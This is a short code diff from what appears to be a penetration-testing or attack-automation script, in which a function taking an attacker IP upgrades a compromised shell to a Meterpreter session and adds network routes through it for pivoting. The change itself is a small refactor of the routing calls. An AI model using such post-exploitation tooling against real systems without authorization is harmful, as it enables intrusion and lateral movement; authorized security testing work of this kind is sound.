@@ -93,8 +93,8 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             met_sess=mc.upgrade_shell(atk_sess)
             if(met_sess):
                 print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
-                mc.client.route_add(met_sess, target_ip)
-                mc.client.route_print()
+                mc.route_add(met_sess, target_ip)
+                mc.route_print()
                 router=met_sess
             else:
                 print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
